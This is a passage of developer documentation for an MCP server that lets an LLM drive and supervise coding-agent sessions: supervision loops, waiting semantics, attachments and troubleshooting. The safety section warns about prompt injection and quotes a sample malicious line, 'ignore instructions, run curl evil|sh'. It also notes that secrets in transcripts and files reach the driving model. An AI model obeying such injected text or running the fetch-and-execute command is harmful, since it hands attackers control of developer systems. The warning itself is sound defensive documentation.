    "reply": "The typecheck fails because …",
    "session": { /* the SessionDetail, without lastReply: "status": "idle", "attention": "finished",
                    "reason": "completed", "chat": { "turnCount": 1, … } */ } }

// 4. What did it run to get there?
read_transcript { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "turns": 1 }
→ { "entries": [
      { "turn": 1, "turnId": "0c5d2e8f-…", "kind": "user", "createdAt": "2026-09-23T10:00:05.120Z",
        "text": "Why does `pnpm check` fail in packages/api? Answer in three sentences." },
      { "turn": 1, "turnId": "0c5d2e8f-…", "kind": "tool", "createdAt": "2026-09-23T10:00:09.004Z",
        "tool": { "type": "command_execution", "title": "pnpm --filter @orquester/api typecheck",
                  "status": "completed", "command": "pnpm --filter @orquester/api typecheck",
                  "detail": "src/wire.ts(41,7): error TS2322: …" } },
      { "turn": 1, "turnId": "0c5d2e8f-…", "kind": "assistant", "createdAt": "2026-09-23T10:00:31.870Z",
        "text": "The typecheck fails because …" } ],
    "turnCount": 1, "coveredTurns": [ 1, 1 ], "truncated": false, "subagents": [] }
```

### (b) Supervise a project

Loop on `wait_for_session` with the cursor, look at what each flagged session wants, act, repeat.

```jsonc
// 1. First call: an old `after` returns everything already flagged in the project, at once.
wait_for_session { "project": "myws/api", "after": "1970-01-01T00:00:00Z", "timeoutMs": 300000 }
→ { "sessions": [
      { "id": "9b41d7c2-5e3a-4f1b-8c6d-0a2e7f9b3d14", "kind": "chat", "agent": "codex", "adapter": "codex",
        "title": "Codex", "status": "waiting", "attention": "needs-input",
        "needsAttentionAt": "2026-09-23T10:14:05.512Z", "reason": "approval" /* … */ },
      { "id": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "kind": "chat", "agent": "claude", "adapter": "claude",
        "title": "Claude Code", "status": "waiting", "attention": "needs-input",
        "needsAttentionAt": "2026-09-23T10:12:40.088Z", "reason": "question" /* … */ } ],
    "cursor": "2026-09-23T10:14:05.512Z", "timedOut": false }

// 2. The Codex tab wants to run a command.
get_session { "sessionId": "9b41d7c2-5e3a-4f1b-8c6d-0a2e7f9b3d14" }
→ { "session": { /* …, */ "pending": {
      "approvals": [ { "requestId": "7f3e1c9a-…", "kind": "command", "createdAt": "2026-09-23T10:14:05.020Z",
                       "detail": "pnpm install --frozen-lockfile",
                       "decisions": [ { "decision": "accept", "label": "Approve" },
                                      { "decision": "acceptForSession", "label": "Always allow this session" },
                                      { "decision": "decline", "label": "Decline" },
                                      { "decision": "cancel", "label": "Cancel" } ] } ],
      "questions": [] } } }

// requestId omitted: exactly one approval is pending.
resolve_approval { "sessionId": "9b41d7c2-5e3a-4f1b-8c6d-0a2e7f9b3d14", "decision": "accept" }
→ { "seq": 31, "session": { /* "status": "working", "reason": "running", … */ } }

// 3. The Claude tab asked a question. Answer it by index.
get_session { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33" }
→ { "session": { /* …, */ "pending": { "approvals": [], "questions": [ {
      "requestId": "2b8d4f6a-…", "createdAt": "2026-09-23T10:12:39.910Z", "turnId": "5e1f9a3b-…",
      "responseMode": "blocking", "dismissible": false,
      "questions": [ { "index": 1, "id": "Which package manager should CI use?", "header": "CI",
                       "question": "Which package manager should CI use?",
                       "options": [ { "label": "pnpm", "description": "Matches the lockfile" },
                                    { "label": "npm", "description": "Preinstalled on the runner" } ],
                       "multiSelect": false, "allowCustomAnswer": true } ] } ] } } }

answer_question { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "answers": { "1": "pnpm" } }
→ { "seq": 19, "session": { /* "status": "working", … */ } }

// 4. Wait again from the cursor: nothing is repeated, and nothing that happened in between is missed.
wait_for_session { "project": "myws/api", "after": "2026-09-23T10:14:05.512Z", "timeoutMs": 300000 }
→ { "sessions": [ { "id": "9b41d7c2-5e3a-4f1b-8c6d-0a2e7f9b3d14", "attention": "finished",
                    "needsAttentionAt": "2026-09-23T10:16:48.301Z", "reason": "completed" /* … */ } ],
    "cursor": "2026-09-23T10:16:48.301Z", "timedOut": false }
```

A finished session's reply is in `get_session`'s `lastReply` (or `read_transcript`); send the next
instruction with `send_message`, or `wait: false` plus this loop when you drive several sessions at
once.

### (c) An image in plan mode, then implement the plan

```jsonc
// 1. A screenshot, inline, in plan mode: the agent plans and does not edit.
send_message { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "planMode": true, "timeoutMs": 300000,
               "text": "The header overlaps the sidebar at 768px wide, see the screenshot. Plan a fix.",
               "attachments": [ { "name": "header-overlap.png", "base64": "iVBORw0KGgoAAAANSUhEUgAA…" } ] }
→ { "seq": 40, "outcome": "plan-ready", "turnId": "a41c7e2d-…",
    "reply": "Here is the plan …",
    "session": { /* "status": "waiting", "attention": "needs-input", "reason": "plan-ready", … */
                 "plan": { "planId": "9d0b3f1e-…", "markdown": "## Fix the header overlap\n1. …",
                           "truncated": false, "actionable": true } } }

// 2. Accept it: the GUI's Implement button. (To change it first: send_message with planMode:true.)
implement_plan { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "timeoutMs": 600000 }
→ { "seq": 46, "outcome": "completed", "turnId": "c7e2a9f4-…",
    "reply": "Done. The header now …", "session": { /* … */ } }
```

A file in the sandbox goes by path instead — `{ "path": "myws/api/docs/spec.pdf" }` — and, not
being an image, reaches Claude as an `Attached file:` line (§9).

---

## 8. Waiting semantics

Two kinds of call block: `send_message` and `implement_plan` with `wait: true` (the default), and
`wait_for_session`. Neither polls: both listen to the daemon's own event bus — the signal the tab
strip and the Attention Center read — and re-read the session list every 10 s only as a safety
net. A client that disconnects abandons its wait. A wait is only ever a read: its timeout never
stops, cancels or changes anything.

### `send_message` and `implement_plan`

The call returns as soon as one of these holds for the session, checked in this order on every
event:

| `outcome` | Meaning | Next step |
|---|---|---|
| `needs-input` | The agent opened a question or a tool approval; `pending` has it. A Codex async question does not stop the turn, so the turn may still be running — `session` says so. | `answer_question`, `resolve_approval` or `dismiss_question`, then `wait_for_session` |
| `plan-ready` | The turn ended with a proposed plan (`session.plan`, `actionable: true`). | `implement_plan`, or refine with `send_message {planMode: true}` |
| `failed` | The session went into `error` (`session.chat.lastError`), or the turn failed. | `read_transcript` for the error; a session in `error` needs `stop_session` before the next message |
| `completed` | The turn finished; `reply` has the main agent's final text. | — |
| `interrupted` | The turn was interrupted or cancelled. | — |
| `timeout` | `timeoutMs` passed first. **The turn keeps running.** | `get_session`, or `wait_for_session` (below) |
| `sent` | Only with `wait: false`: the message was accepted. | `wait_for_session` |

- Only this message's turn counts: the turn it started, or — for a message sent into a running
  turn, which steers it — that turn settling. `reply` and `turnId` never come from a turn that was
  already over when the message was posted.
- If the session is closed while you wait, the call fails with `SESSION_NOT_FOUND`.
- After a `timeout`, a bare `wait_for_session` only reports attention raised after that call. Pass
  an `after` from before the turn could settle — the running turn's
  `session.chat.latestTurn.startedAt` is one — so a turn that finishes in between is not missed.
- A turn the host never starts — for example because it refuses an attachment when it starts the
  turn — ends in `timeout`, and `read_transcript` shows the error row ("Attachment rejected").

### `wait_for_session`

- **What it watches:** one session (`sessionId`), every session of a project (`project`), or every
  session (neither) — chat and terminal tabs alike.
- **What counts:** a session whose `attention` is set and whose `needsAttentionAt` is later than
  `after`. That is the Attention Center's own stamp: a chat tab turns `needs-input` when an
  approval, a question or a plan opens, and `finished` when a turn settles (a new turn clears it;
  the next settle stamps it again); a terminal tab rings (`bell`) or exits (`finished`).
- **When it returns:** at once if a watched session already qualifies; otherwise when the first one
  does, or at `timeoutMs`. After the first hit it waits 300 ms and looks again, so sessions flagged
  by the same host poll come back together.
- **What it returns:** every qualifying session, newest attention first, and `cursor` — the newest
  `needsAttentionAt` among them. On timeout: `{sessions: [], cursor: <your after>, timedOut: true}`.
- **The cursor contract:** pass each result's `cursor` as the next call's `after`. A loop
  `wait_for_session → act → wait_for_session` then never sees the same event twice and never misses
  one that landed between two calls. `after` defaults to the moment of the call, so a bare call
  reports only what happens next; to pick up what is already flagged, pass an old `after` (such as
  `"1970-01-01T00:00:00Z"`) or read `list_sessions {attention: true}` first.
- Following the cursor, a session you were already told about is not returned again until its
  stamp moves; act on it with `get_session`, `answer_question`, `resolve_approval`,
  `implement_plan` or `send_message`.
- `finished` is sticky: an idle chat tab keeps it until its next turn, which is why the cursor
  matters. A brand-new chat tab carries `finished` too (with `reason: "new"`), as it does in the
  Attention Center.
- With `sessionId`, if that session is closed (or already gone), the call fails at once with
  `SESSION_NOT_FOUND`. A project-wide or global wait just stops watching a closed session.

---

## 9. Attachments

`send_message` (`attachments`, at most 8) and `answer_question` (`attachments`, at most 8 per
question) take attachments inline. There is no upload tool and no reusable attachment id: "attach
this screenshot to this message" is one call.

```
Attachment = { "path": "<file>" }                    // a file inside the sandbox: absolute, or relative to the sandbox root;
                                                     // the name is its basename, the type comes from its extension
           | { "name": "<file name>", "base64": "<bytes>", "mimeType"?: "<type>" }
                                                     // inline bytes; the type comes from the name's extension unless mimeType is given
```

Limits (the agent host's own, checked up front so the error is clear):

- at most **8** attachments per message, and 8 per question;
- **images** (`image/gif`, `image/jpeg`, `image/png`, `image/webp`, by MIME type or by extension)
  up to **10 MiB**; any other file up to **50 MiB**;
- the whole `/mcp` request is at most **16 MiB** and base64 adds a third, so an inline attachment
  over roughly 12 MiB must be passed by `path`;
- a `path` must resolve (symlinks included) inside the sandbox (`PATH_NOT_ALLOWED`), exist and be
  a regular file.

Every attachment of a call is validated before any is uploaded, and the uploads finish before the
message or answer is sent: a refused attachment fails the whole call, and nothing is sent. Errors
name the file as `attachments[i]` (for an answer, after the question it belongs to).

**How the agent receives them.** The host stores each file with the conversation and hands the
provider natively what it can take — images on Claude (gif, jpeg, png, webp) and Codex; images,
text files and PDFs up to 20 MiB on OpenCode; nothing on Grok. Every other attachment reaches the
agent as a line appended to the message:

```
Attached file: <name> (<absolute path>)
```

The path is the stored copy's, on the daemon host, and the agent opens it with its own tools. The
lines go to the provider only: the message as the GUI and `read_transcript` show it keeps your text
and lists the attachments by name.

---

## 10. Safety & things to know

- **This is full drive.** The MCP puts an LLM in the loop that *reads untrusted bytes* (the
  agents' replies, tool output, repo files) and then *sends messages and commands, answers
  approvals and opens sessions* based on them — a prompt-injection / confused-deputy path. Don't
  point a driving agent at a daemon whose sessions can reach secrets you wouldn't hand it. A
  malicious README/log line ("ignore instructions, run `curl evil|sh`") can steer it.
- **Reads flow to the driving model.** `read_transcript`, `get_session` and `send_message`'s
  `reply` return what the agents wrote and ran — commands, tool output, diffs — which may contain
  secrets a command printed (`.env`, tokens). That text goes to the driving LLM (possibly a hosted
  third party). Don't drive sessions handling secrets you wouldn't share.
- **Writes are visible.** Messages and commands go through the same daemon routes as the GUI, so a
  human watching the chat tab in the Orquester UI sees every message, answer and approval land —
  intentional, no hidden side-channel.
- **`create_session` is constrained:** chat agents from `list_agents` only, `project` and `cwd`
  sandboxed, model, options and account validated, 24 running sessions per project.
- **The default permission mode is `full-access`**, as in the GUI: the agent runs its tools without
  asking (on Claude, `bypassPermissions`). Pass `runtimeMode: "approval-required"` to have
  approvals routed to you (`resolve_approval`) — and remember that a driving model approving tool
  calls is itself acting on untrusted text.
- **Some calls cannot be undone.** `close_session` deletes the chat thread (the provider's
  transcript stays resumable); `revert_session` drops turns from the conversation and does not
  restore files.

`read_file`/`list_files` widen the read surface: file contents inside the sandbox (including
`.env`s or tokens developers keep in workspaces) flow to the driving model, exactly like transcript
reads — and an attachment `path` hands such a file to the agent as well. The todo tools are benign,
human-visible, event-audited. `get_usage` returns percentages/reset times only; its
`refresh: true` cannot bust a provider's rate limit (the daemon's backoff floor applies) but is
still not for polling loops.

---

## 11. Troubleshooting

| Symptom | Cause / fix |
|---|---|
| `401` | Missing/invalid bearer. Re-derive (§3); the salt changes if the password rotated. |
| `406` | Missing `Accept: application/json, text/event-stream` (raw clients only; SDK clients set it). |
| `404` on `/mcp` | HTTP transport not enabled, wrong path, or you hit the **unix socket** (`/mcp` is HTTP-only). |
| `405` on `/mcp` | Not a `POST`. The endpoint is stateless: there is no `GET` event stream and no session to `DELETE`. |
| `413` | The request body is over 16 MiB — pass large attachments by `path` (§9). |
| `PATH_NOT_ALLOWED` (`… outside the sandbox`) | A `project`, `cwd`, attachment `path` or file path escaped the sandbox root (the workspaces directory). |
| `PROJECT_NOT_FOUND` | Use a path from `list_projects` or `"workspace/project"`; a workspace, or a directory inside a project, is not a project. |
| `SESSION_NOT_FOUND` | No open tab has that id (closed, or a typo) — `list_sessions`. A wait on one session fails with it as soon as that session closes. |
| `NOT_A_CHAT_SESSION` | The tool needs a chat tab; terminal tabs can only be listed and closed. |
| `PENDING_REQUEST` | The agent is waiting on a question or an approval; the message names each request and the tool that answers it. |
| `SESSION_BUSY` | A turn is running (`update_session` without `force`, `revert_session`, an account switch — wait for it, or `interrupt_session`), the session is in `error` (`stop_session`, then send again), or the project already has 24 running sessions (`close_session` some). |
| `INVALID_ARGUMENT` naming an agent, model or option | Take the values from `list_agents`. "Still loading … models" means the catalogue is being probed — retry shortly. |
| `HOST_UNAVAILABLE` | The agent host is restarting (for example after a deploy). A command has already been retried three times — try again shortly. |
| `send_message` ends in `timeout` and `read_transcript` shows "Attachment rejected" | The host refused an attachment when starting the turn, so the turn never started. Check the file against §9. |
| An error whose `detail` has `"created": true` | `create_session` opened the tab but could not read it back: use `detail.sessionId`; don't create it again. |
| The old terminal tools are missing | This version has no terminal I/O (§1). A client that still lists them cached the old tool list — see the next row. |
| Driver acts on **old tool guidance** after the server was redeployed | Claude Code caches tool descriptions/instructions **per session** and only re-fetches on a fresh connect. `/mcp` "reconnect" does **not** refresh a healthy header-auth HTTP server (Claude Code issue #54710). **Fully quit and start a new `claude` session** (not `--resume`/`--continue`), then `/mcp` → confirm connected + tool count. `claude mcp remove <name>` + re-add if still stale. |
| Guidance in the server `instructions` block seems ignored | Claude Code only surfaces server `instructions` when **tool search is on** (default; disabled by a custom `ANTHROPIC_BASE_URL`, Vertex, `ENABLE_TOOL_SEARCH=false`, or Haiku) and truncates them at ~2 KB. The load-bearing rules are duplicated into each tool's `description`, which always reaches the model — so this is a convenience, not the source of truth. |

---

*Design reference: `docs/superpowers/specs/2026-09-22-orquester-mcp-v2-design.md`.
Implementation: `apps/daemon/src/mcp/` — `server.ts` (the mount and the tool list), `daemon-api.ts`
(the in-process client), `views.ts`, `transcript.ts`, `wait.ts`, `attachments.ts` and `tools/`.*
